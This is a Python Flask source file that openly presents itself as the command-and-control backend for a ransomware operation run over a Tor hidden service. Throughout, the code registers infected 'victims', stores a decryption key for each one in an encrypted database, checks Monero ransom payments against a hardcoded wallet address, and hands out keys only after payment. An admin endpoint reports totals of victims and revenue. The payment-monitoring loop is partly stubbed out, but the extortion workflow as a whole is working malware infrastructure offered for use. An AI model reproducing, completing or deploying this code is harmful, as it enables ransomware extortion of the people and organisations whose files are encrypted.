#!/usr/bin/env python3
"""
C2 SERVER - ENCRYPTED BACKEND
==============================
Runs on attacker-controlled Tor hidden service.
Manages victim database, payment verification, and key distribution.

Architecture:
- REST API over Tor
- Monero payment monitoring
- AES encrypted database
- Key management
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import os
import base64
import uuid
from datetime import datetime, timedelta
from cryptography.fernet import Fernet
import sqlite3
import requests

# ====================
# CONFIGURATION
# ====================

app = Flask(__name__)
CORS(app)

# Database
DATABASE_PATH = '/var/ransomware/victims.db'
MASTER_ENCRYPTION_KEY = Fernet.generate_key()  # Should be stored securely

# Monero Configuration
MONERO_DAEMON = "http://localhost:18081"  # Local monerod instance
MONERO_WALLET_ADDRESS = "4BJV39ZuKUhesFTWiXdKbL4NLPF7kMAZBHhtaQY4FqfvATNK8KSfCYVwJCa1BnKNNKJk2FwNEi4UXW6nZUZN6SZCxHt6RjdV"

# ====================
# DATABASE MANAGER
# ====================

class VictimDatabase:
    """Encrypted victim database"""
    
    def __init__(self, db_path):
        self.db_path = db_path
        self.cipher = Fernet(MASTER_ENCRYPTION_KEY)
        self.init_database()
    
    def init_database(self):
        """Create database tables"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY,
                ransom_id TEXT UNIQUE NOT NULL,
                monero_address TEXT NOT NULL,
                ransom_amount_xmr REAL NOT NULL,
                files_encrypted INTEGER,
                data_size_gb REAL,
                infection_timestamp TEXT,
                deadline TEXT,
                status TEXT DEFAULT 'INFECTED',
                payment_received BOOLEAN DEFAULT 0,
                payment_txid TEXT,
                payment_timestamp TEXT,
                master_key_encrypted TEXT,
                system_info TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def register_victim(self, ransom_id, monero_addr, ransom_xmr, system_info, master_key):
        """Register new victim"""
        try:
            # Encrypt master key
            encrypted_key = self.cipher.encrypt(master_key).decode()
            
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO victims 
                (ransom_id, monero_address, ransom_amount_xmr, files_encrypted, 
                 data_size_gb, infection_timestamp, deadline, status, master_key_encrypted, system_info)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                ransom_id,
                monero_addr,
                ransom_xmr,
                system_info.get('files_encrypted'),
                system_info.get('data_size_gb'),
                datetime.now().isoformat(),
                (datetime.now() + timedelta(hours=24)).isoformat(),
                'INFECTED',
                encrypted_key,
                json.dumps(system_info)
            ))
            
            conn.commit()
            conn.close()
            
            return True
        except Exception as e:
            print(f"[!] Registration error: {e}")
            return False
    
    def get_victim(self, ransom_id):
        """Get victim record"""
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM victims WHERE ransom_id = ?', (ransom_id,))
        victim = cursor.fetchone()
        conn.close()
        
        return dict(victim) if victim else None
    
    def verify_payment(self, ransom_id, txid, amount):
        """Mark payment as verified"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            UPDATE victims 
            SET payment_received = 1, payment_txid = ?, payment_timestamp = ?, status = 'PAID'
            WHERE ransom_id = ?
        ''', (txid, datetime.now().isoformat(), ransom_id))
        
        conn.commit()
        conn.close()
    
    def get_decryption_key(self, ransom_id):
        """Get encrypted master key for victim"""
        try:
            victim = self.get_victim(ransom_id)
            if not victim:
                return None
            
            # Decrypt and return master key
            encrypted_key = victim['master_key_encrypted']
            master_key = self.cipher.decrypt(encrypted_key.encode())
            
            return base64.b64encode(master_key).decode()
        except Exception as e:
            print(f"[!] Key retrieval error: {e}")
            return None

# ====================
# PAYMENT VERIFIER
# ====================

class MoneroPaymentChecker:
    """Check Monero blockchain for payments"""
    
    def __init__(self, daemon_url):
        self.daemon_url = daemon_url
    
    def check_incoming_transfers(self, wallet_address):
        """Check if payment received to wallet"""
        try:
            # Query monerod daemon for incoming transfers
            # (In real scenario, would connect to actual Monero node)
            
            # For testing: simulate
            response = requests.post(
                f"{self.daemon_url}/json_rpc",
                json={
                    "jsonrpc": "2.0",
                    "id": "0",
                    "method": "get_transfers",
                    "params": {"in": True}
                },
                timeout=10
            )
            
            return response.json()
        except Exception as e:
            print(f"[!] Payment check error: {e}")
            return None

# ====================
# DATABASE INSTANCE
# ====================

os.makedirs('/var/ransomware', exist_ok=True)
victims_db = VictimDatabase(DATABASE_PATH)
payment_checker = MoneroPaymentChecker(MONERO_DAEMON)

# ====================
# API ENDPOINTS
# ====================

@app.route('/api/v1/register', methods=['POST'])
def register_infection():
    """Register new infected system"""
    try:
        data = request.json
        
        # Extract info
        ransom_id = data['ransom_id']
        monero_addr = data['monero_address']
        ransom_xmr = data['ransom_amount_xmr']
        system_info = data['system_info']
        
        # Generate master key
        master_key = Fernet.generate_key()
        
        # Register in database
        success = victims_db.register_victim(
            ransom_id, monero_addr, ransom_xmr, system_info, master_key
        )
        
        return jsonify({
            'success': success,
            'ransom_id': ransom_id,
            'monero_address': monero_addr,
            'amount_xmr': ransom_xmr
        }), 200 if success else 400
    
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/api/v1/payment/status/<ransom_id>', methods=['GET'])
def check_payment(ransom_id):
    """Check payment status"""
    try:
        victim = victims_db.get_victim(ransom_id)
        
        if not victim:
            return jsonify({'error': 'Victim not found'}), 404
        
        return jsonify({
            'ransom_id': ransom_id,
            'paid': bool(victim['payment_received']),
            'status': victim['status']
        }), 200
    
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/api/v1/decryption/key/<ransom_id>', methods=['GET'])
def get_decryption_key(ransom_id):
    """Get decryption key (only if payment verified)"""
    try:
        victim = victims_db.get_victim(ransom_id)
        
        if not victim:
            return jsonify({'error': 'Victim not found'}), 404
        
        if not victim['payment_received']:
            return jsonify({'error': 'Payment not verified'}), 403
        
        # Get encrypted key and decrypt
        master_key = victims_db.get_decryption_key(ransom_id)
        
        return jsonify({
            'ransom_id': ransom_id,
            'master_key': master_key,
            'status': 'PAID'
        }), 200
    
    except Exception as e:
        return jsonify({'error': str(e)}), 400

@app.route('/api/v1/admin/stats', methods=['GET'])
def get_stats():
    """Get campaign statistics (admin only)"""
    try:
        conn = sqlite3.connect(DATABASE_PATH)
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM victims')
        total_victims = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM victims WHERE status = 'PAID'")
        paid_victims = cursor.fetchone()[0]
        
        cursor.execute("SELECT SUM(ransom_amount_xmr) FROM victims WHERE status = 'PAID'")
        total_revenue = cursor.fetchone()[0] or 0
        
        conn.close()
        
        return jsonify({
            'total_victims': total_victims,
            'paid_victims': paid_victims,
            'total_revenue_xmr': total_revenue
        }), 200
    
    except Exception as e:
        return jsonify({'error': str(e)}), 400

# ====================
# PAYMENT MONITORING BACKGROUND TASK
# ====================

def monitor_payments():
    """Background task to monitor for incoming Monero payments"""
    while True:
        try:
            conn = sqlite3.connect(DATABASE_PATH)
            cursor = conn.cursor()
            
            # Get all unpaid victims
            cursor.execute("SELECT * FROM victims WHERE status = 'INFECTED'")
            unpaid = cursor.fetchall()
            
            # Check each victim's address for payments
            for victim in unpaid:
                # In real scenario: query Monero node for actual payments
                # For now: simulated
                pass
            
            conn.close()
            
            # Check every 2 minutes
            time.sleep(120)
        
        except Exception as e:
            print(f"[!] Payment monitoring error: {e}")

# ====================
# MAIN
# ====================

if __name__ == '__main__':
    print("[+] C2 Server starting on Tor hidden service...")
    print(f"[+] Database: {DATABASE_PATH}")
    print(f"[+] Listening on: 0.0.0.0:5000 (via Tor)")
    
    # Start payment monitoring in background
    import threading
    import time
    
    payment_thread = threading.Thread(target=monitor_payments, daemon=True)
    payment_thread.start()
    
    # Run Flask app
    app.run(host='0.0.0.0', port=5000, debug=False)
